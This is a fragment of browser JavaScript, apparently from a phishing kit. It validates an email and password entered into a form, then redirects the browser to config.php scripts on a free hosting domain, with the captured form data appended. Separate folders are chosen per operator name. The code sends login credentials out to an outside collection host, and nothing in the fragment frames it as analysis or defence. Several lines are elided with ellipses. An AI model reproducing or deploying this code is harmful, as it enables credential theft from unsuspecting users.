...
const send = document.getElementById("sendTo")
    ...
    if (!validEmail.test(showEmail)) {
        ...
        if (showPass != "") {
            if (showPass.length < 6) {
                ...
                // return location = "config.php?" + url

                if (send.value == "bba") {
                    location = "https://falser-skies.000webhostapp.com/bba/config.php?" + url
                }
                else if (send.value == "anyi") {
                    location = "https://falser-skies.000webhostapp.com/anyi/config.php?" + url
                }
                else if (send.value == "maka") {
                    location = "https://falser-skies.000webhostapp.com/maka/config.php?" + url
                }
                else if (send.value == "akpaz") {
                    location = "https://falser-skies.000webhostapp.com/akpaz/config.php?" + url
                }
